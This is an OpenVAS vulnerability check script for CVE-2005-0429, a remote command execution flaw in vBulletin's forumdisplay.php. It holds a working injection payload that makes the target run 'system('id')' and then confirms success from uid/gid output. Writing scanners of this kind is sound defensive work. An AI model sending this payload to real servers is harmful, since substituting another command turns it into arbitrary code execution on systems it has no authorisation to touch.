# OpenVAS Vulnerability Test
# Description: vBulletin Forumdisplay.PHP Remote Command Execution Vulnerability
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2005 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

CPE = "cpe:/a:vbulletin:vbulletin";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.16455");
  script_version("2019-09-27T07:10:39+0000");
  script_tag(name:"last_modification", value:"2019-09-27 07:10:39 +0000 (Fri, 27 Sep 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2005-0429");
  script_bugtraq_id(12542);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:N");
  script_name("vBulletin Forumdisplay.PHP Remote Command Execution Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2005 David Maciejak");
  script_family("Web application abuses");
  script_dependencies("vbulletin_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("vbulletin/detected");

  script_tag(name:"solution", value:"Upgrade vBulletin 3.0.4 or newer.");

  script_tag(name:"summary", value:"The remote version of vBulletin is vulnerable
  to remote command execution flaw through the script 'forumdisplay.php'.");

  script_tag(name:"impact", value:"A malicious user could exploit this flaw to
  execute arbitrary command on the remote host with the privileges of the web server.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

http_check_remote_code(unique_dir:dir,
                       check_request:'/forumdisplay.php?GLOBALS[]=1&f=2&comma=".system(\'id\')."',
                       check_result:"uid=[0-9]+.*gid=[0-9]+.*",
                       command:"id");

exit(99);
